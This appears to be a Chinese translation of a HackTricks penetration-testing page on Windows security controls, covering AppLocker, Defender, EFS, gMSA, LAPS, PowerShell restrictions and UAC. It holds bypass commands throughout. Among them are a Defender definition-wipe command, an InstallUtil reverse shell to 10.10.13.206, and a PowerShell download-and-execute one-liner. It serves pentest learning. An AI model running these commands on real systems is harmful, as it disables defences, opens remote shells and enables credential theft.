# Windows Security Controls

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker策略

应用程序白名单是一份批准的软件应用程序或可在系统上存在和运行的可执行文件列表。其目标是保护环境免受有害恶意软件和与组织特定业务需求不符的未经批准软件的影响。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)是微软的**应用程序白名单解决方案**，使系统管理员可以控制**用户可以运行的应用程序和文件**。它提供对可执行文件、脚本、Windows安装程序文件、DLL、打包应用和打包应用安装程序的**细粒度控制**。\
组织通常会**阻止cmd.exe和PowerShell.exe**以及对某些目录的写访问，**但这些都可以被绕过**。

### 检查

检查哪些文件/扩展名被列入黑名单/白名单：

```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

这个注册表路径包含了AppLocker应用的配置和策略，提供了一种查看系统上当前生效规则集的方式：

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### 绕过

* 用于绕过AppLocker策略的有用**可写文件夹**：如果AppLocker允许在`C:\Windows\System32`或`C:\Windows`中执行任何操作，那么有**可写文件夹**可用于**绕过此限制**。

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

* 常见的**受信任的**[**"LOLBAS's"**](https://lolbas-project.github.io/)二进制文件也可以用来绕过AppLocker。
* **编写不当的规则也可能被绕过**
* 例如，**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**，您可以在任何地方创建一个名为`allowed`的**文件夹**，它将被允许。
* 组织通常会专注于**阻止`%System32%\WindowsPowerShell\v1.0\powershell.exe`可执行文件**，但忽略了**其他**[**PowerShell可执行文件位置**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations)，如`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`或`PowerShell_ISE.exe`。
* **很少启用DLL强制执行**，因为它可能会给系统增加额外负载，并需要大量测试以确保不会出现问题。因此，使用**DLL作为后门**将有助于绕过AppLocker。
* 您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)在任何进程中**执行Powershell**代码并绕过AppLocker。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## 凭据存储

### 安全帐户管理器（SAM）

本地凭据存在于此文件中，密码已经被哈希。

### 本地安全机构（LSA）- LSASS

**凭据**（哈希）被**保存**在此子系统的**内存**中，用于单点登录。\
**LSA**管理本地**安全策略**（密码策略，用户权限...），**身份验证**，**访问令牌**...\
LSA将**检查**提供的凭据是否在**SAM**文件中（用于本地登录），并与**域控制器**通信以验证域用户。

**凭据**被**保存**在**LSASS进程**中：Kerberos票证，NT和LM哈希，易于解密的密码。

### LSA秘密

LSA可能会在磁盘中保存一些凭据：

* Active Directory计算机帐户的密码（无法访问的域控制器）。
* Windows服务帐户的密码
* 计划任务的密码
* 更多（IIS应用程序的密码...）

### NTDS.dit

这是Active Directory的数据库。仅存在于域控制器中。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender)是Windows 10和Windows 11以及Windows Server版本中可用的防病毒软件。它**阻止**常见的渗透测试工具，如\*\*`WinPEAS`**。但是，有方法可以**绕过这些保护\*\*。

### 检查

要检查**Defender**的**状态**，您可以执行PS cmdlet **`Get-MpComputerStatus`**（检查\*\*`RealTimeProtectionEnabled`\*\*的值以了解是否已激活）：

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

您也可以运行以下命令进行枚举：

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 加密文件系统（EFS）

EFS通过加密来保护文件，利用称为**文件加密密钥（FEK）的对称密钥**。该密钥使用用户的**公钥**加密，并存储在加密文件的$EFS **备用数据流**中。需要解密时，用户的数字证书对应的**私钥**用于从$EFS流中解密FEK。更多详细信息可在[此处](https://en.wikipedia.org/wiki/Encrypting\_File\_System)找到。

**无需用户启动的解密场景**包括：

* 当文件或文件夹移动到非EFS文件系统（如[FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)）时，它们会自动解密。
* 通过SMB/CIFS协议发送的加密文件在传输之前会被解密。

这种加密方法允许所有者**透明访问**加密文件。然而，仅仅更改所有者的密码并登录将不允许解密。

**要点**：

* EFS使用对称FEK，使用用户的公钥加密。
* 解密使用用户的私钥访问FEK。
* 在特定条件下会自动解密，如复制到FAT32或网络传输。
* 所有者可以访问加密文件而无需额外步骤。

### 检查EFS信息

检查**用户**是否**使用**了此**服务**，检查路径是否存在：`C:\users\<username>\appdata\roaming\Microsoft\Protect`

使用`cipher /c \<file>`检查文件的**访问权限**。您还可以在文件夹中使用`cipher /e`和`cipher /d`来**加密**和**解密**所有文件。

### 解密EFS文件

#### 作为权限系统

这种方式需要**受害用户**在主机内运行一个**进程**。如果是这种情况，可以使用`meterpreter`会话来模拟用户进程的令牌（从`incognito`中的`impersonate_token`）。或者您可以直接`migrate`到用户的进程。

#### 知道用户的密码

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## 群组管理服务帐户（gMSA）

微软开发了**群组管理服务帐户（gMSA）**，以简化IT基础设施中服务帐户的管理。与通常启用“**密码永不过期**”设置的传统服务帐户不同，gMSA提供了更安全和可管理的解决方案：

* **自动密码管理**：gMSA使用一个复杂的、240字符的密码，根据域或计算机策略自动更改。这个过程由微软的密钥分发服务（KDC）处理，消除了手动密码更新的需要。
* **增强安全性**：这些帐户不会被锁定，也不能用于交互式登录，增强了安全性。
* **多主机支持**：gMSA可以在多个主机之间共享，非常适合在多台服务器上运行的服务。
* **定时任务功能**：与托管服务帐户不同，gMSA支持运行定时任务。
* **简化的SPN管理**：当计算机的sAMaccount详细信息或DNS名称发生变化时，系统会自动更新服务主体名称（SPN），简化了SPN管理。

gMSA的密码存储在LDAP属性\_**msDS-ManagedPassword**\_中，并且由域控制器（DCs）每30天自动重置一次。这个密码是一个加密的数据块，称为[MSDS-MANAGEDPASSWORD\_BLOB](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)，只能由授权管理员和安装了gMSA的服务器检索，确保了一个安全的环境。要访问这些信息，需要一个安全连接，如LDAPS，或者连接必须经过“密封和安全”认证。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../.gitbook/assets/asd1.png)

您可以使用[GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)来读取这个密码：

```
/GMSAPasswordReader --AccountName jkohler
```

[**在此帖子中查找更多信息**](https://cube0x0.github.io/Relaying-for-gMSA/)

还可以查看这个关于如何执行**NTLM中继攻击**以**读取** **gMSA** **密码**的[网页](https://cube0x0.github.io/Relaying-for-gMSA/)。

## LAPS

**本地管理员密码解决方案（LAPS）**，可从[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)下载，可管理本地管理员密码。这些密码是**随机的**、独特的，并且**定期更改**，存储在Active Directory中。通过ACLs对授权用户进行限制访问这些密码。在授予足够权限的情况下，可以读取本地管理员密码。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS 受限语言模式

PowerShell [**受限语言模式**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **限制了许多**有效使用PowerShell所需的功能，如阻止COM对象，仅允许批准的.NET类型，基于XAML的工作流程，PowerShell类等。

### **检查**

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### 绕过

```powershell
#Easy bypass
Powershell -version 2
```

在当前的Windows中，绕过不起作用，但可以使用[**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)。\
**要编译它，您可能需要** **添加引用** -> _浏览_ -> _浏览_ -> 添加 `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` 并**将项目更改为 .Net4.5**。

#### 直接绕过:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### 反向 shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

您可以使用[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)或[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)来在任何进程中执行Powershell代码并绕过受限模式。有关更多信息，请查看：[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。

## PS执行策略

默认情况下设置为**restricted**。绕过此策略的主要方法：

```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

更多内容请查看[这里](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## 安全支持提供程序接口（SSPI）

是用于验证用户的API。

SSPI将负责找到两台想要通信的机器的适当协议。首选方法是Kerberos。然后SSPI将协商将使用哪种验证协议，这些验证协议称为安全支持提供程序（SSP），以DLL的形式位于每台Windows机器中，两台机器必须支持相同的协议才能通信。

### 主要SSP

* **Kerberos**：首选
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1**和**NTLMv2**：兼容性原因
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**：Web服务器和LDAP，密码以MD5哈希的形式
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**：SSL和TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**：用于协商要使用的协议（Kerberos或NTLM，Kerberos是默认值）
* %windir%\Windows\System32\lsasrv.dll

#### 协商可以提供多种方法或仅一种。

## UAC - 用户账户控制

[用户账户控制（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)是一项功能，可为**提升的活动**启用**同意提示**。

{% content-ref url="uac-user-account-control.md" %}
[uac-user-account-control.md](uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具驱动。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
